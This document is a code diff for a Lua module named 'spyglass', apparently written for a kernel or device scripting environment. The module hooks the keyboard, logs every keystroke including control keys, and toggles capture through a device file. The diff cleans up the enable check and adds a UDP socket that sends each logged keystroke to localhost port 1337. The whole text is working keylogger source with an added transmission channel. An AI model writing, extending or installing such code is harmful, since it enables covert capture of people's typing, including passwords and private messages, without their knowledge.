@@ -22,7 +22,8 @@
 --
 
 local notifier = require("notifier")
-local device   = require("device")
+local device = require("device")
+local inet = require("socket.inet")
 
 local control = {
 	 [0] = "nul",  [1] = "soh",  [2] = "stx",  [3] = "etx",  [4] = "eot",  [5] = "enq",
@@ -48,10 +49,10 @@ function spyglass:read()
 end
 
 function spyglass:write(buf)
-	local enable = tonumber(buf)
-	if enable == 1 and not self.notifier then
+	local enable = tonumber(buf) ~= 0
+	if enable and not self.notifier then
 		self.notifier = notifier.keyboard(self.callback)
-	elseif enable == 0 and self.notifier then
+	elseif not enable and self.notifier then
 		self.notifier:delete()
 		self.notifier = nil
 	end
@@ -65,10 +66,12 @@ function spyglass.callback(event, down, shift, key)
 		local log = printable(keysym) and string.char(keysym) or
 			string.format("<%s>", control[keysym])
 		spyglass.log = spyglass.log .. log
+		spyglass.client:send(log, inet.localhost, 1337)
 	end
 	return notify.OK
 end
 
 spyglass.notifier = notifier.keyboard(spyglass.callback)
 spyglass.device = device.new(spyglass)
+spyglass.client = inet.udp()
 
